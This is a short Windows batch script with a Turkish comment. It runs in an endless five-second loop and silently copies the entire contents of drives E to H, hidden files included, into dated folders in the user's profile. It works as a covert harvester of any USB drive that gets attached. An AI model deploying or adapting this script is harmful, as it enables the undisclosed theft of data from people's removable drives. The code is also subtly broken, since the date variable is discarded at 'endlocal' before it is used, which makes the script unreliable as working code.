echo Bilgisayar disk bolumleri C varsayilan, D cd-rom olarak varsayilmistir.

:start
cls
@echo off

setlocal
for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
if "%version%" == "10.0" set tarih=%date:~-4,4%%date:~-7,2%%date:~-10,2%
if "%version%" == "6.1" set tarih=%date:~-2,2%%date:~3,2%%date:~0,2%
endlocal

if exist e: (
xcopy e: %userprofile%\E-%tarih% /s/h/r/i/k/e/y
)
if exist f: (
xcopy f: %userprofile%\F-%tarih% /s/h/r/i/k/e/y
)
if exist g: (
xcopy g: %userprofile%\G-%tarih% /s/h/r/i/k/e/y
)
if exist h: (
xcopy H: %userprofile%\H-%tarih% /s/h/r/i/k/e/y
)

timeout 5 /nobreAK
goto start
